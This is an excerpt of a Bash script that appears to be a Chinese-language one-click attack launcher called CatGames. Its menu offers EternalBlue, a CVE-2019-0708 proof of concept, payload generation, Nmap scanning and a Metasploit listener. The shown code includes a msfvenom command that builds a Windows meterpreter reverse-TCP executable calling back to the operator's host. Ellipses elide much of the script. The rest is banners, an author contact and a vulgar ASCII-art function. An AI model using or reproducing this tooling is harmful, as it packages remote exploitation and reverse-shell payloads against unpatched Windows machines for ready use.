...
Initialization_Tools(){
	clear	
	echo -e "\033[31mCatGames自动攻击工具初始化中......\033[0m"
	b=''
	for ((i=0;$i<=100;i+=2))
	do
...
\_____| /_/   |_|   |_|   \_____/ /_/   |_| /_/        |_| |_____| /_____/ 
        "
echo -e "By_CatGamesGa0       CatGames.cn Email：Ga0CatGames@cumt.edu.cn" 
}
CatGames_CaoNiMa(){
	echo -e "
       ┏┓　 ┏┓ 
...
Get_Payload(){
	...
	msfvenom –platform windows -p windows/meterpreter/reverse_tcp LHOST=$MeIP LPORT=$Me_Port EXITFUNC=thread -b ‘\x00’ -f exe-only -o /$Me_MuLu/CatGames_payload.exe
...
CatGames_LoGo
echo -e "\033[31m======================="
echo -e "\033[31m|请输入需要使用的功能！"
echo -e "\033[33m|[1]永恒之蓝"
echo -e "\033[34m|[2]使用CVE-2019-0708-POC"
echo -e "\033[35m|[3]一键日卫星"
echo -e "\033[36m|[4]生成Payload"
echo -e "\033[37m|[5]Nmap扫描" 
echo -e "\033[31m|[6]Msf监听IP与端口"
echo -e "\033[33m|[7]关于"
echo -e "\033[31m======================="
...
Initialization_Tools
echo -e "\E[1;31m<:::::::::::::: \e[97m自动攻击工具 \E[1;31m:::::::::::::::>"
